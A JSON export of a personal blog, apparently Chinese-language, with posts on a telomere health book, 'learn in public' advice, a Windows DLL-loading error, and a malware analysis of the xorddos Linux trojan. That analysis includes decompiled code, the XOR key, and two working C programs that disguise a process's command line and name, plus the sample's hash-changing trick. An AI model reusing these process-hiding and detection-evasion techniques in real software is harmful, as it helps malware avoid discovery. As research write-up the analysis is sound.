{"posts":[{"title":"端粒效应","text":"获得 2009 年诺贝尔生理或医学奖的 伊丽莎白·布莱克本在 《端粒效应》一书中说明：人只所以变老，是由于某些细胞不再更新了，而细胞分裂更新的限制在于 “端粒”。 端粒是染色体末端的 DNA 序列，在细胞分裂过程中，端粒起到保护 DNA 序列的作用。所以，人之所变老的本质原因是 「端粒变短」。 影响端粒变短的因素 思想压力：研究表明长期照顾患病小孩的母亲，端粒长度较正常人变短 敌意：看哪儿都不对，和周围的人关系极差 悲观：对事情总有一个负面的预期 胡思乱想：抑郁，都是乱想负面的东西，觉得不公平对待 缓解负面情绪的方法 把压力视为挑战：对压力的反应是威胁还是挑战，决定压力的性质 专注力训练：冥想 找到人生的目标：find something bigger than yourself 锻炼对端粒的好处 人体是反脆弱系统：锻炼的本质是对身体的适度打击 细胞的反击：适度的锻炼能使端粒变长，并增加「自由基」 抗氧化剂增多：突然增多的自由基使得身体增加抗氧化剂，锻炼改变了自由基和抗氧化剂的平衡 锻炼到底是影响端粒还是端粒脢，分子生物学上的机制科学家现在还不知道 两种科学的锻炼方法 有氧耐力训练：长跑，每次跑四十五分钟，每周跑三次，坚持六个月，你的端粒酶的活性就能提高两倍 高强度的间歇训练：短跑结合恢复的办法，快跑几分钟，停下来慢走休息，然后再快跑 节食和减肥的观念 体重可能并不是肥胖的最好指标，更好的指标是 「腰臀比」 肚子大代表新陈代谢水平低，会让端粒变短 肚子大，腰臀比过高，胆固醇超标；高血压；胰岛素抵抗，具备三个就是新陈代谢综合症 饥饿节食减肥不可取，就算减下体重也很容易报复性反弹 糖可能是各种健康问题的罪魁祸首 从端粒说，细胞有三个敌人 细胞发炎：肥胖使细胞容易发炎，从而使端粒变短。omega-3 可以防止细胞发炎，鱼类、牛奶、有机鸡蛋中含有 omega-3 脂肪酸 氧化应激反应：维生素 C 和维生素 E 可以对抗氧化应急反应。饮食中可以吃些水果、胡萝卜、西红柿、土豆和绿叶蔬菜 胰岛素抵抗：对抗胰岛素抵抗，关键是要少吃糖 从看端粒的角度分析饮食 对端粒有害的食物有：红肉，加工肉类（香肠）、白面包、含糖饮料、omega-6 ，过量饮酒 对端粒有益的食物有：植物纤维、全麦、蔬菜、坚果、豆类、水果、海带、omega-3 人的环境对端粒的影响 城市的居民比乡村居民更容易视压力为威胁，因为城市居民的“杏仁核” 部位比较活跃，这个部位主要负责恐惧感 社会关系比金钱对端粒的影响更大，只要能满足基本的生活需求，金钱对端粒的影响就不大 受教育的程度对端粒影响很大，研究表明受教育程度越高端粒越长 职业很重要比收入对端粒影响大，一个从事基本工作的白领也比收入更高的蓝领端粒要长 从端粒看，父母对孩子的影响 遗传：端粒长度可以不通过基因遗传，而是“直接传递”，怀孕时父母的端粒比较短，孩子出生时端粒也就比较短 孕期压力：怀孕期间母亲的压力情况，人遇到压力会分泌皮质醇，从而影响孩子的端粒 家庭环境：越少父母的关爱，被父母忽视的孩子，端粒会比较短","link":"/cn/living_younger_healthier_logger/"},{"title":"Learn In Public 摘要","text":"source: https://www.swyx.io/learn-in-public/ a habit of creating learning exhaust Write blogs and tutorials and cheatsheets. Speak at meetups and conferences. Ask and answer things on Stackoverflow or Reddit. Avoid the walled gardens like Slack and Discord, they’re not public. Make Youtube videos or Twitch streams. Start a newsletter. Draw cartoons (people loooove cartoons!) Whatever your thing is, make the thing you wish you had found when you were learning. Don’t judge your results by “claps” or retweets or stars or upvotes Oh you think you’re done? Don’t stop there: Enjoyed a coding video? Reach out to the speaker/instructor and thank them, and ask questions. Make PR’s to libraries you use. Make your own libraries no one will ever use. Clone stuff you like, from scratch, to see how they work. Teach workshops. Go to conferences and summarize what you learned. The subheading under this rule would be: Try your best to be right, but don’t worry when you’re wrong. People think you suck? Good. You agree. Ask them to explain, in detail, why you suck You want to just feel good or you want to be good? Then go away and prove them wrong. Of course, if they get abusive block them. At some point you’ll get some support behind you. People notice genuine learners. They’ll want to help you. Don’t tell them, but they just became your mentors. This is very important: Pick up what they put down Because you learn in public. By teaching you, they teach many.","link":"/en/learn_in_public/"},{"title":"xorddos 样本进程隐藏的小伎俩","text":"进程隐藏上周由于工作原因接触到xorddos的样本，这个样本在过去一年的时间里非常常见，变种也很多，拿到的样本比较有趣的是 ps 无法发现进程。 123456789101112131415161718192021[root@localhost ~]# ps -ef | grep /usr/bin...root 4597 4594 0 00:37 ? 00:00:00 gnome-pty-helperroot 4598 4594 0 00:37 pts/1 00:00:00 bashoracle 5359 1 0 00:41 ? 00:00:00 ora_smco_orcloracle 5378 1 0 00:41 ? 00:00:00 ora_w000_orcloracle 5586 1 0 00:42 ? 00:00:00 ora_j000_orcloracle 5588 1 0 00:42 ? 00:00:00 ora_j001_orclroot 5666 1 0 00:43 ? 00:00:00 shroot 5669 1 0 00:43 ? 00:00:00 echo &quot;find&quot;root 5672 1 0 00:43 ? 00:00:00 ls -laroot 5675 1 0 00:43 ? 00:00:00 bashroot 5678 1 0 00:43 ? 00:00:00 gnome-terminalroot 5683 1 0 00:43 ? 00:00:00 cd /etcroot 5686 1 0 00:43 ? 00:00:00 toproot 5689 1 0 00:43 ? 00:00:00 shroot 5692 1 0 00:43 ? 00:00:00 gnome-terminalroot 5695 1 0 00:43 ? 00:00:00 ifconfigroot 5696 4598 0 00:43 pts/1 00:00:00 ps -ef 而使用lsof却可以清除地看见样本正在努力地干活。 1234567891011121314151617181920212223242526[root@localhost ~]# lsof +d /usr/binCOMMAND PID USER FD TYPE DEVICE SIZE NODE NAMEhidd 1853 root txt REG 3,1 33708 2467454 /usr/bin/hiddckucbzknt 2014 root txt REG 3,1 610331 2459176 /usr/bin/ckucbzkntbxfs 2143 xfs txt REG 3,1 107460 2468483 /usr/bin/xfsXorg 3117 root txt REG 3,1 1890596 2466732 /usr/bin/Xorggnome-ses 4073 root txt REG 3,1 129356 2459482 /usr/bin/gnome-sessionssh-agent 4201 root txt REG 3,1 88996 2467513 /usr/bin/ssh-agentdbus-laun 4245 root txt REG 3,1 23796 2471600 /usr/bin/dbus-launchgnome-key 4255 root txt REG 3,1 97396 2473617 /usr/bin/gnome-keyring-daemonmetacity 4290 root txt REG 3,1 521080 2464500 /usr/bin/metacitygnome-pan 4296 root txt REG 3,1 540868 2465177 /usr/bin/gnome-panelnautilus 4298 root txt REG 3,1 1348932 2461620 /usr/bin/nautilusgnome-vol 4310 root txt REG 3,1 65240 2464498 /usr/bin/gnome-volume-managerbt-applet 4334 root txt REG 3,1 30452 2464773 /usr/bin/bt-appletnm-applet 4352 root txt REG 3,1 312432 2467723 /usr/bin/nm-appletgnome-pow 4381 root txt REG 3,1 195284 2459473 /usr/bin/gnome-power-managerpam-panel 4383 root txt REG 3,1 39148 2461862 /usr/bin/pam-panel-icondbus-laun 4473 root txt REG 3,1 23796 2471600 /usr/bin/dbus-launchgnome-scr 4512 root txt REG 3,1 168628 2468487 /usr/bin/gnome-screensavergnome-ter 4594 root txt REG 3,1 309368 2464648 /usr/bin/gnome-terminalgadcgkcqn 4681 root txt REG 3,1 610331 2460159 /usr/bin/gadcgkcqnigadcgkcqn 4684 root txt REG 3,1 610331 2460159 /usr/bin/gadcgkcqnigadcgkcqn 4687 root txt REG 3,1 610331 2460159 /usr/bin/gadcgkcqnigadcgkcqn 4690 root txt REG 3,1 610331 2460159 /usr/bin/gadcgkcqnigadcgkcqn 4693 root txt REG 3,1 610331 2460159 /usr/bin/gadcgkcqni 阅读汇编代码，分析具体原因，发现xorddos将一些关键信息加密了，F5处理过的代码如下 1234567891011121314151617int __cdecl encrypt_code(int a1, int a2){ signed int v2; // ecx@2 if ( a2 &gt; 0 ) { v2 = 0; do { *(_BYTE *)(v2 + a1) ^= xorkeys[(((_BYTE)v2 + ((unsigned int)(v2 &gt;&gt; 31) &gt;&gt; 28)) &amp; 0xF) - ((unsigned int)(v2 &gt;&gt; 31) &gt;&gt; 28)]; ++v2; } while ( v2 != a2 ); } return a1;} xorkey 为 BB2FA36AAA9541F0 用idapython 写个小脚本，简单处理一下。 1234567891011121314151617181920212223242526272829303132from idautils import *from idc import *def get_string(addr): out = &quot;&quot; while True: if Byte(addr) != 0: out += chr(Byte(addr)) else: break addr += 1 return out def decrypt(data): xorkey = 'BB2FA36AAA9541F0' length = len(data) o = &quot;&quot; if length &gt; 0: v2 = 0 while v2 &lt; length: o += chr( ord(data[v2]) ^ ord(xorkey[((v2 + ((v2 &gt;&gt; 31) &gt;&gt; 28)) &amp; 0xF) - ( (v2 &gt;&gt; 31) &gt;&gt; 28)]) ) v2 += 1 return oea = ScreenEA()string = get_string(ea)dec = decrypt(string)print 'Addr: 0x%x, %s' % (ea, dec)MakeComm(ea, dec) 处理后可以看到伪装的命令行信息，daemonname。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263.data:080CBB40 daemonname db '!#Ff3VE.-7',17h,'V[_ 0',0 ; DATA XREF: main+31Eo.data:080CBB40 ; main+4AEo ....data:080CBB40 ; cat resolv.conf.data:080CBB51 align 4.data:080CBB54 a12 db '1*2',0 ; sh.data:080CBB58 db 0.data:080CBB59 db 0.data:080CBB5A db 0.data:080CBB5B db 0.data:080CBB5C db 0.data:080CBB5D db 0.data:080CBB5E db 0.data:080CBB5F db 0.data:080CBB60 db 0.data:080CBB61 db 0.data:080CBB62 db 0.data:080CBB63 db 0.data:080CBB64 db 0.data:080CBB65 db 0.data:080CBB66 db 0.data:080CBB67 db 0.data:080CBB68 db 20h ; bash.data:080CBB69 db 23h ; #.data:080CBB6A db 41h ; A.data:080CBB6B db 2Eh ; ..data:080CBB6C db 41h ; A.data:080CBB6D db 0.data:080CBB6E db 0.data:080CBB6F db 0.data:080CBB70 db 0.data:080CBB71 db 0....data:080CBBB8 db 2Eh ; . ; ls -la.data:080CBBB9 db 31h ; 1.data:080CBBBA db 12h.data:080CBBBB db 6Bh ; k.data:080CBBBC db 2Dh ; -.data:080CBBBD db 52h ; R.data:080CBBBE db 36h ; 6.data:080CBBBF db 0.data:080CBBC0 db 0.data:080CBBC1 db 0.data:080CBBC2 db 0.data:080CBBC3 db 0.data:080CBBC4 db 0.data:080CBBC5 db 0.data:080CBBC6 db 0.data:080CBBC7 db 0.data:080CBBC8 db 0.data:080CBBC9 db 0.data:080CBBCA db 0.data:080CBBCB db 0.data:080CBBCC db 36h ; 6 ; top.data:080CBBCD db 2Dh ; -.data:080CBBCE db 42h ; B.data:080CBBCF db 46h ; F.data:080CBBD0 db 0.data:080CBBD1 db 0.data:080CBBD2 db 0... 呵呵，已经看到 top， ls -al 等信息了，查看daemonname 的交叉引用，发现在main函数中，到main里看看。 1234567891011121314151617.text:0804AC30 ; int __cdecl main(int argc, const char **argv, const char **envp).text:0804AC30 public main.text:0804AC30 main proc near ; DATA XREF: _start+17o.....text:0804AF4E mov ebx, offset daemonname ; &quot;!#Ff3VE.-7\\x17V[_ 0&quot;....text:0804AFC2 loc_804AFC2: ; CODE XREF: main+3ABj.text:0804AFC2 mov [esp], ebx.text:0804AFC5 add ebx, 14h.text:0804AFC8 mov dword ptr [esp+4], 14h.text:0804AFD0 call encrypt_code.text:0804AFD5 cmp ebx, offset unk_80CBD0C.text:0804AFDB jnz short loc_804AFC2 这段汇编代码，使用了一个循环，调用encrypt_code 对daemonname进行了解密。后面的代码，用到了daemonname的地方有下面几处， 第一处 12345678910111213141516.text:0804B29F call getpid.text:0804B2A4 mov dword ptr [esp+8], (offset aDD+3) ; &quot;%d&quot;.text:0804B2AC mov dword ptr [esp+4], 0Ah.text:0804B2B4 mov [esp], esi ；第三形参 pid.text:0804B2B7 mov [esp+0Ch], eax.text:0804B2BB call snprintf.text:0804B2C0 mov dword ptr [esp+4], 17h.text:0804B2C8 mov dword ptr [esp], 0.text:0804B2CF call randomid.text:0804B2D4 mov [esp+8], esi.text:0804B2D8 mov [esp], edi ；第一形参 要跑的木马.text:0804B2DB movzx eax, ax.text:0804B2DE lea eax, [eax+eax*4].text:0804B2E1 lea eax, daemonname[eax*4] ; &quot;!#Ff3VE.-7\\x17V[_ 0&quot;.text:0804B2E8 mov [esp+4], eax ; 第二形参 daemonname.text:0804B2EC call LinuxExec_Argv2 第二处 123456789101112131415161718192021222324.text:0804B932 lea edx, [ebp+var_1888].text:0804B938 add ebx, 1.text:0804B93B mov [esp], edx.text:0804B93E call randmd5.text:0804B943 mov [ebp+var_22], 0.text:0804B94A mov [ebp+var_1E], 0.text:0804B951 mov [ebp+var_1A], 0.text:0804B957 call getpid.text:0804B95C mov dword ptr [esp+8], (offset aDD+3) ; &quot;%d&quot;.text:0804B964 mov dword ptr [esp+4], 0Ah.text:0804B96C mov [esp], esi.text:0804B96F mov [esp+0Ch], eax.text:0804B973 call snprintf.text:0804B978 mov dword ptr [esp+4], 17h.text:0804B980 mov dword ptr [esp], 0.text:0804B987 call randomid.text:0804B98C mov [esp+8], esi.text:0804B990 movzx eax, ax.text:0804B993 lea eax, [eax+eax*4].text:0804B996 lea eax, daemonname[eax*4] ; &quot;!#Ff3VE.-7\\x17V[_ 0&quot;.text:0804B99D mov [esp+4], eax.text:0804B9A1 lea eax, [ebp+var_1888].text:0804B9A7 mov [esp], eax.text:0804B9AA call LinuxExec_Argv2 第三处 123456789101112131415161718192021222324.text:0804B9DF lea edx, [ebp+var_1C88].text:0804B9E5 add ebx, 1.text:0804B9E8 mov [esp], edx.text:0804B9EB call randmd5.text:0804B9F0 mov [ebp+var_22], 0.text:0804B9F7 mov [ebp+var_1E], 0.text:0804B9FE mov [ebp+var_1A], 0.text:0804BA04 call getpid.text:0804BA09 mov dword ptr [esp+8], (offset aDD+3) ; &quot;%d&quot;.text:0804BA11 mov dword ptr [esp+4], 0Ah.text:0804BA19 mov [esp], esi.text:0804BA1C mov [esp+0Ch], eax.text:0804BA20 call snprintf.text:0804BA25 mov dword ptr [esp+4], 17h.text:0804BA2D mov dword ptr [esp], 0.text:0804BA34 call randomid.text:0804BA39 mov [esp+8], esi.text:0804BA3D movzx eax, ax.text:0804BA40 lea eax, [eax+eax*4].text:0804BA43 lea eax, daemonname[eax*4] ; &quot;!#Ff3VE.-7\\x17V[_ 0&quot;.text:0804BA4A mov [esp+4], eax.text:0804BA4E lea eax, [ebp+var_1C88].text:0804BA54 mov [esp], eax.text:0804BA57 call LinuxExec_Argv2 都是作为LinuxExec_Argv2 参数使用的，接着来看LinuxExec_Argv2 的代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354.text:08048520 LinuxExec_Argv2 proc near ; CODE XREF: DelService+B3p.text:08048520 ; DelService+CBlp ....text:08048520.text:08048520 argv = dword ptr -18h.text:08048520 var_14 = dword ptr -14h.text:08048520 var_10 = dword ptr -10h.text:08048520 var_C = dword ptr -0Ch.text:08048520 var_8 = dword ptr -8.text:08048520 var_4 = dword ptr -4.text:08048520 file = dword ptr 8.text:08048520 arg_4 = dword ptr 0Ch.text:08048520 arg_8 = dword ptr 10h.text:08048520.text:08048520 push ebp.text:08048521 mov ebp, esp.text:08048523 sub esp, 28h.text:08048526 mov [ebp+var_4], esi.text:08048529 mov esi, [ebp+file].text:0804852C mov [ebp+var_8], ebx.text:0804852F mov [ebp+argv], 0.text:08048536 mov [ebp+var_14], 0.text:0804853D mov [ebp+var_10], 0.text:08048544 mov [ebp+var_C], 0.text:0804854B call doublefork.text:08048550 test eax, eax.text:08048552 jz short ZERO.text:08048554 mov ebx, [ebp+var_8].text:08048557 mov esi, [ebp+var_4].text:0804855A mov esp, ebp.text:0804855C pop ebp.text:0804855D retn.text:0804855E ; ---------------------------------------------------------------------------.text:0804855E.text:0804855E ZERO: ; CODE XREF: LinuxExec_Argv2+32j.text:0804855E mov ebx, 3.text:08048563.text:08048563 LOOP: ; CODE XREF: LinuxExec_Argv2+54j.text:08048563 mov [esp], ebx ; fd.text:08048566 add ebx, 1.text:08048569 call close.text:0804856E cmp ebx, 400h ；400h == 1024.text:08048574 jnz short LOOP.text:08048576 mov eax, [ebp+arg_4].text:08048579 mov [ebp+argv], esi.text:0804857C mov [esp], esi ; file.text:0804857F mov [ebp+var_14], eax.text:08048582 mov eax, [ebp+arg_8]；eax = pid.text:08048585 mov [ebp+var_10], eax.text:08048588 lea eax, [ebp+argv].text:0804858B mov [esp+4], eax ; argv.text:0804858F call execvp.text:08048594 mov dword ptr [esp], 0 ; status.text:0804859B call exit.text:0804859B LinuxExec_Argv2 endp LinuxExec_Argv2 有三个参数。最终执行了execvp 1234.text:0804857C mov [esp], esi ; file ....text:0804858B mov [esp+4], eax ; argv.text:0804858F call execvp 伪代码为， 1execvp(file, &amp;argv); file 就是arg_0, 需要分析argv， 调出栈图就比较清晰了。 123456789101112-00000018 argv dd ? ; offset-00000014 var_14 dd ?-00000010 var_10 dd ?-0000000C var_C dd ?-00000008 var_8 dd ?-00000004 var_4 dd ?+00000000 s db 4 dup(?)+00000004 r db 4 dup(?)+00000008 file dd ? ; offset+0000000C arg_4 dd ?+00000010 arg_8 dd ? 首先是这句 123456.text:08048529 mov esi, [ebp+file]....text:0804852F mov [ebp+argv], 0....text:08048579 mov [ebp+argv], esi 执行了这几句代码后，栈图发生了变化 1234567891011-00000018 argv arg_0 ; offset-00000014 var_14 dd ?-00000010 var_10 dd ?-0000000C var_C dd ?-00000008 var_8 dd ?-00000004 var_4 dd ?+00000000 s db 4 dup(?)+00000004 r db 4 dup(?)+00000008 file dd ? ; offset+0000000C arg_4 dd ?+00000010 arg_8 dd ? 再看这几句代码 1234.text:08048576 mov eax, [ebp+arg_4].text:08048579 mov [ebp+argv], esi....text:0804857F mov [ebp+var_14], eax 执行了这几句代码后，栈图发生了变化 1234567891011-00000018 argv arg_0 ; offset-00000014 var_14 arg_4-00000010 var_10 dd ?-0000000C var_C dd ?-00000008 var_8 dd ?-00000004 var_4 dd ?+00000000 s db 4 dup(?)+00000004 r db 4 dup(?)+00000008 file dd ? ; offset+0000000C arg_4 dd ?+00000010 arg_8 dd ? 接下来是这几句代码 12.text:08048582 mov eax, [ebp+arg_8]；eax = pid.text:08048585 mov [ebp+var_10], eax 执行了这几句代码后，栈图发生了变化 123456789101112-00000018 argv arg_0 ; offset-00000014 var_14 arg_4-00000010 var_10 arg_8-0000000C var_C 0-00000008 var_8 dd ?-00000004 var_4 dd ?+00000000 s db 4 dup(?)+00000004 r db 4 dup(?)+00000008 file dd ? ; offset+0000000C arg_4 dd ?+00000010 arg_8 dd ?` main函数中对LinuxExec_Argv2 的调用的为代码为 1LinuxExec_Argv2('木马路径', '伪装命令行', pid); 因此最后调用的execvp的伪代码为 1execvp('木马路径', argv); 将进入 main 函数参数个数为3的流程，用IDA重命名后，关键代码为 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758text:0804B5D3 PARAM_NUM_3: ; CODE XREF: main+3CD\u0018j.text:0804B5D3 lea eax, [ebp+var_18].text:0804B5D6 mov [esp+4], eax.text:0804B5DA lea eax, [ebp+self_path].text:0804B5E0 mov [esp], eax.text:0804B5E3 call readfile.text:0804B5E8 mov edx, [ebp+argv_arr].text:0804B5EE mov ebx, [edx+4].text:0804B5F1 mov [ebp+self_file_content], eax.text:0804B5F7 mov [esp], ebx.text:0804B5FA call strlen.text:0804B5FF mov [esp+4], ebx.text:0804B603 mov [esp+8], eax.text:0804B607 lea eax, [ebp+fake_cmd].text:0804B60D mov [esp], eax.text:0804B610 call memmove.text:0804B615 mov dword ptr [esp+0Ch], 0.text:0804B61D mov dword ptr [esp+8], 0Ah.text:0804B625 mov dword ptr [esp+4], 0.text:0804B62D mov edx, [ebp+argv_arr].text:0804B633 mov eax, [edx+8].text:0804B636 mov [esp], eax.text:0804B639 call __strtol_internal.text:0804B63E mov esi, eax.text:0804B640 mov eax, [ebp+argv_arr].text:0804B646 mov ebx, [eax].text:0804B648 mov [esp], ebx.text:0804B64B call strlen.text:0804B650 mov [esp], ebx.text:0804B653 mov dword ptr [esp+4], 0.text:0804B65B mov [esp+8], eax.text:0804B65F call memset.text:0804B664 mov edx, [ebp+argv_arr].text:0804B66A mov ebx, [edx+4].text:0804B66D mov [esp], ebx.text:0804B670 call strlen.text:0804B675 mov [esp], ebx.text:0804B678 mov dword ptr [esp+4], 0.text:0804B680 mov [esp+8], eax.text:0804B684 call memset.text:0804B689 mov eax, [ebp+argv_arr].text:0804B68F mov ebx, [eax+8].text:0804B692 mov [esp], ebx.text:0804B695 call strlen.text:0804B69A mov [esp], ebx.text:0804B69D mov dword ptr [esp+4], 0.text:0804B6A5 mov [esp+8], eax.text:0804B6A9 call memset.text:0804B6AE lea edx, [ebp+fake_cmd].text:0804B6B4 mov [esp+4], edx.text:0804B6B8 mov edx, [ebp+argv_arr].text:0804B6BE mov eax, [edx].text:0804B6C0 mov [esp], eax.text:0804B6C3 call strcpy.text:0804B6C8 lea eax, [ebp+filename].text:0804B6CE mov [esp+0Ch], esi.text:0804B6D2 lea esi, [ebp+randstr_10] 上面代码的原理大致等同于下面这段代码 12345678910111213141516171819202122232425#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main(int argc, char **argv){ char fake_cmd[256]; memset(&amp;fake_cmd, 0, 256); char * argv_arr_1 = argv[1]; int argv_arr_1_length = strlen(argv[1]); memmove(&amp;fake_cmd, argv_arr_1, argv_arr_1_length); long pid_long = strtol(argv[2], 0, 10); char * v29 = (char *)*argv; int v30 = strlen(*argv); memset(v29, 0, v30); char * v31 = argv[1]; int v32 = strlen(argv[1]); memset(v31, 0, v32); char * v33 = argv[2]; int v34 = strlen(argv[2]); memset(v33, 0, v34); strcpy(*argv, fake_cmd); sleep(300);} 编译后执行可以看到效果和运行样本的一样。 1234567891011➜ ~ gcc -o fakeexe exe.c➜ ~ ./fakeexe &quot;ls -al&quot; 2554➜ ~ cat /proc/2605/cmdlinels -al➜ ~ ls -l /proc/2605/exelrwxrwxrwx. 1 henices henices 0 8月 2 12:01 /proc/2605/exe -&gt; /home/henices/research/xorddos/fakeexe➜ ~ ps -elf | grep &quot;ls -al&quot; | grep -v grep0 S henices 2605 25307 0 80 0 - 1043 hrtime 12:01 pts/5 00:00:00 ls -al 其实效果并不好，可以轻易发现踪迹。 123➜ ~ ps -e | grep fakeexe 2605 pts/9 00:00:00 fakeexe 其实有更好的做法，使用 prctl ，至少可以把ps给搞定。 123456789101112131415161718192021222324252627#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/prctl.h&gt;int main(int argc, char **argv){ char fake_cmd[256]; memset(&amp;fake_cmd, 0, 256); char * argv_arr_1 = argv[1]; int argv_arr_1_length = strlen(argv[1]); memmove(&amp;fake_cmd, argv_arr_1, argv_arr_1_length); long pid_long = strtol(argv[2], 0, 10); char * v29 = (char *)*argv; int v30 = strlen(*argv); memset(v29, 0, v30); char * v31 = argv[1]; int v32 = strlen(argv[1]); memset(v31, 0, v32); char * v33 = argv[2]; int v34 = strlen(argv[2]); memset(v33, 0, v34); strcpy(*argv, fake_cmd); prctl(PR_SET_NAME, &quot;bash&quot;); sleep(300);} 编译执行后可以看到效果。 12345678➜ ~ ps -e | grep bash 4858 pts/5 00:00:00 bash➜ ~ cat /proc/4858/cmdline ls -al➜ ~ lsof -d txt | grep fakeexebash 4858 henices txt REG 253,2 8816 4588423 /home/henices/research/xorddos/fakeexe xorddos 的多态 （Polymorphic）xorddos这个样本还值得一提的是，这个样本会不断变化，多态这个词翻译的可能不太准确，可以参见上面的英文，自行理解。 12345678910111213141516171819202122232425int __cdecl randmd5(char *filename){ int fd; // eax@1 int fd_dup; // esi@1 mode_t v4; // [sp+8h] [bp-20h]@0 int addr; // [sp+15h] [bp-13h]@1 int v6; // [sp+19h] [bp-Fh]@1 __int16 v7; // [sp+1Dh] [bp-Bh]@1 char v8; // [sp+1Fh] [bp-9h]@1 addr = 0; v6 = 0; v7 = 0; v8 = 0; fd = open(filename, 1, v4); fd_dup = fd; if ( fd &gt; 0 ) { lseek(fd, 0, SEEK_END); randstr((int)&amp;addr, 10); write(fd_dup, &amp;addr, 11u); close(fd_dup); } return 0;} xorddos 样本多态主要就是用这个函数，每次在文件末尾写上10个字节的随机字符。这样样本md5和大小都会发生变化，使得一些检测方法失效。 其他正因为这种隐藏方法并不理想，后面xorddos出现了带rootkit的版本，进化了。","link":"/cn/xorddos_hide/"},{"title":"解决 Windows Rx034","text":"以前没有遇上这个错误，这次遇上这个错误是装vim的YouCompleteMe插件后出现，因此很容易想到是装插件引起的这个错误，错误提示Runtime Error 如下图： 先放狗搜一下，微软的对R6034的解释如下： 12345An application has made an attempt to load the C runtime library without usinga manifest. This is an unsupported way to load Visual C++ DLLs. You need tomodify your application to build with a manifest. For more information, see the&quot;Visual C++ Libraries as Shared Side-by-Side Assemblies&quot; topic in the productdocumentation. 微软的链接中也提到了解决的方法 123456Rebuild your application to include a manifest. Building an application withVisual Studio automatically puts the manifest into the resulting .exe or .dllfile. If you are building at the command line, use the mt.exe tool to add themanifest as a resource. Use resource ID 1 if you build an .exe, and resourceID 2 if you build a .dll. For more information, see How to: Embed a ManifestInside a C/C++ Application. 大概的意思是需要使用manifest.xml来指定需要加载的DLL。上网又翻看了几个链接发现这个错误的成因比较复杂，主要原因是加载mscvr*.dll 出现了问题。不管怎样还是先看看是否使用了 manifest。从微软的解决办法可以知道，manifest很有可能在资源文件里。 还是先看看manifest的作用，在msdn网站搜索相关内容，根据《Understanding Manifest Generation for C/C++ Programs》中的内容，manfest.xml可以是一个外部的XML文件也可以是嵌入在程序的资源文件中。manifest.xml用于管理程序在运行时需要的共享程序集的名字和版本。如果程序只依赖 VisualC++ 的程序集（CRT，MFC，ATL等），manifest会被链接器自动生成。Manifest的Sxs指定了其依赖的清单名称,版本,资源,和其他组件。Sxs是Windows XP引入的新技术，vs 2005 开始使用，全名叫Side by Side assembly，主要还是为了解决兼容性问题，这样同一个系统可以存在不同版本的同名文件而互相不影响各自的运行。 现在需要定位gvim.exe加载哪个DLL引起了R6034错误，使用Process Explorer发现是加载ycm_client_support.pyd导致。删除YouCompleteMe插件后错误消失。 先看看ycm_client_support.pyd是否使用了manifest.xml, 使用神器TC, F3一下，可以查看manifest的情况。 发现其实ycm_client_support.pyd已经使用了manifest，但是仍然出现R6034错误。上网搜索了一番（见文末的参考链接），发现这就是非常著名的DLL Hell了，维基百科中专门记录了这个问题。 http://en.wikipedia.org/wiki/Dll_hell 不论如何应该就是DLL加载时出错了，可以使用Process Explorer 工具来查看出问题的进程，看看在进程空间内具体是什么情况。 哈哈，发现了一些情况，msvcr90.dll在gvim进程空间里有两个！再看看这两个DLL的位置。 删除掉不在C:\\WINDOWS\\WinSxS\\目录里的msvcr90.dll，问题得以解决。由于这个错误是因为加载ycm_client_support.pyd引起的，再看看ycm_client_support.pyd的情况，拿出TC直接F3一下，又发现了一些有用的信息。ycm_client_support.pyd加载的是cmake目录下的msvcr90.dll, 正常情况下因该使用 C:\\Windows\\winsxs 目录下的msvcr90.dll 查看一下系统环境变量： 12345678910D:\\Program Files\\Microsoft Visual Studio 9.0\\VC&gt; set | findstr PathPath=D:\\Program Files\\Microsoft Visual Studio 9.0\\Common7\\IDE;D:\\Program Files\\Microsoft Visual Studio 9.0\\VC\\BIN;D:\\Program Files\\Microsoft Visual Studio 9.0\\Common7\\Tools;c:\\Windows\\Microsoft.NET\\Framework\\v3.5;c:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727;D:\\Program Files\\Microsoft Visual Studio 9.0\\VC\\VCPackages;C:\\Program Files\\\\Microsoft SDKs\\Windows\\v6.0A\\bin;C:\\Windows\\system32;C:\\Windows;d:\\Program Files\\CMake 2.8\\bin;d:\\Program Files\\LLVM 3.4.svn\\bin;d:\\Program Files\\Git\\cmd;d:\\Python27;D:\\Program Files\\IDM Computer Solutions\\UltraEdit\\PSModulePath=C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\ 引错误的原因是Windows程序加载DLL是会先加载PATH变量中的DLL文件，后面会加载manifest指定的WinSxS目录的文件，这样就加载了两次，引起了错误。 这个问题涉及 Windows加载DLL文件的顺序，Windows定位 DLL文件的顺序和一个注册表键值相关，这个键值是： HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode SafeDllSearchMode的值为1，开启SafeDllSearchMode，SafeDllSearchMode的值为0，禁用SafeDllSearchMode。 Windows系统默认开启SafeDllSearchMode （Windows XP SP2 后），MSDN文章《Dynamic-Link Library Search Order》中指出，在SafeDllSearchMode开启的情况下，Windows定位DLL文件的顺序为： The directory from which the application loaded. The system directory. ( GetSystemDirectory ) The 16-bit system directory. The Windows directory. (GetWindowsDirectory ) The current directory. The directories that are listed in the PATH environment variable. 在SafeDllSearchMode关闭的情况下，Windows定位DLL文件的顺序为： The directory from which the application loaded. The current directory. The system directory. (GetSystemDirectory ) The 16-bit system directory. The Windows directory. ( GetWindowsDirectory) The directories that are listed in the PATH environment variable. 另外，《Dynamic-Link Library Search Order》中指出使用manifest可以指定加载DLL的路径，但实际的情况是有可能加载多个DLL导致进程崩溃。 Desktop applications can control the location from which a DLL is loaded by specifying a full path, using DLL redirection, or by using a manifest. If none of these methods are used, the system searches for the DLL at load time as described in this section. 参考资料[1]《Windows via C/C++ Fifth Edition》[2] Side-by-side Assemblies http://msdn.microsoft.com/en-us/library/aa376307.aspx[3] DLL Hell http://en.wikipedia.org/wiki/Dll_hell[4] C Run-Time Error R6034 http://msdn.microsoft.com/en-us/library/ms235560(v=vs.90).aspx[5] Understanding Manifest Generation for C/C++ Programs http://msdn.microsoft.com/en-us/library/ms235542.aspx[6] Search Path Used by Windows to Locate a DLL http://msdn.microsoft.com/en-us/library/7d83bc18.aspx[7] 